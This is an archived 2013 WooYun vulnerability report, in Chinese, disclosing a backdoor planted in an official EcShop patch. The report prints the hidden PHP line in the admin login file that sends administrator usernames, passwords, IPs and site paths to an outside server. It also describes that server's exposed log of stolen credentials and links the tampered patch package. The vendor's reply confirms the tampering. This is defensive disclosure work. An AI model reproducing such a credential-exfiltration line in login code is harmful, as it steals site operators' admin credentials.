@@ -1,0 +1,207 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		EcShop官方补丁存后门（非lib_base.php那个），反向分析到黑客服务器，已证明大量电商网站中招  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		EcShop官方补丁存后门（非lib_base.php那个），反向分析到黑客服务器，已证明大量电商网站中招  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2013-06-04 19:35</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-04：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-08：	细节向第三方安全合作伙伴开放<br/>
+									2013-06-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-25：	细节向普通白帽子公开<br/>
+									2013-07-15：	细节向实习白帽子公开<br/>
+									2013-09-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">我们的网站ecshop有点二次开发，所以每次升级补丁都要对比下修改，结果这次对比发现了个大问题，官方的补丁文件内有段后门代码，目前来看应该是截订单的人留得，黑暗啊！<br />
+<br />
+反向分析了后门源码，找到了黑客的服务器，目测已经大量电商沦陷，我的妈呀！Ecshop你叫我们小站长肿么办！！<br />
+<br />
+求乌云救救我们！！</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">补丁是 273utf8_patch006 ，包我幸运的保留下来了，提供给乌云管理放到网盘给厂商和安全研究人员分析。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://pan.baidu.com/share/link?shareid=3699376066&amp;uk=456103769</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+问题出在 /admin/privilege.php 中（管理员身份验证文件），登录成功设置身份认证信息前，一个file_get_content函数，怪不得会绕过之前一些大牛们的分析。<br />
+<br />
+</p><pre><code>stat privilege.php <br />
+16777218 43425476 -rw-r--r-- 1 root root 0 25952 &quot;Jun  4 19:16:09 2013&quot; &quot;May  6 14:18:36 2013&quot; &quot;Jun  4 18:59:14 2013&quot; &quot;May  6 14:18:36 2013&quot; 4096 56 0 privilege.php<br />
+<br />
+@file_get_contents(&#039;http://bbs.olyouxi.com/api/manyou/ecshop/w2.php?username=&#039;.$_POST[&#039;username&#039;].&#039;&amp;password=&#039;.$_POST[&#039;password&#039;].&#039;---&#039;.$_SERVER[&#039;REMOTE_ADDR&#039;].&#039;---&#039;.date(&#039;Y-m-d|H:i:s&#039;).&#039;---&#039;.$_SERVER[&#039;HTTP_HOST&#039;].$_SERVER[&#039;PHP_SELF&#039;]);<br />
+<br />
+        // 登录成功<br />
+        set_admin_session($row[&#039;user_id&#039;], $row[&#039;user_name&#039;], $row[&#039;action_list&#039;], $row[&#039;last_login&#039;]);</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">这个代码将管理员用户名、密码、IP、时间和后台地址等信息通通的发到远程接口上，http://bbs.olyouxi.com/api/manyou/ecshop/w2.php 。<br />
+<br />
+<br />
+<br />
+这个地址直接访问没什么，当我访问 ecshop 这个目录的时候发现居然可以目录遍历，还有一个 ok.php文件<br />
+<br />
+</p><pre><code>http://bbs.olyouxi.com/api/manyou/ecshop/</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/0419224572e01a9b7c42506a4af648d4a85ef9df.png" target="_blank"><img src="../images/0419224572e01a9b7c42506a4af648d4a85ef9df.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+在访问一下ok.php我震惊了！！<br />
+<br />
+</p><pre><code>http://bbs.olyouxi.com/api/manyou/ecshop/ok.php</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/04192538c89e98bcec3ba35b5aad995803fcedff.jpg" target="_blank"><img src="../images/04192538c89e98bcec3ba35b5aad995803fcedff.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+就是这个后门所记录的那些数据，居然直接在这个文件里！受害人数扔在增长<br />
+<br />
+</p><p class="detail"><a href="../images/0419260353ebdb69feabcc0c03757fd6b489c171.jpg" target="_blank"><img src="../images/0419260353ebdb69feabcc0c03757fd6b489c171.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">还能说啥。。。求牛人搞定黑客神马的！<br />
+<br />
+求乌云救救我们！！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-025145" title="EcShop官方补丁存后门（非lib_base.php那个），反向分析到黑客服务器，已证明大量电商网站中招">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2013-06-05 09:34</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">之前的补丁包也被同时篡改，新补丁中已全部处理。<br />
+非常感谢您为shopex信息安全做的贡献<br />
+谢谢</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="25145";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
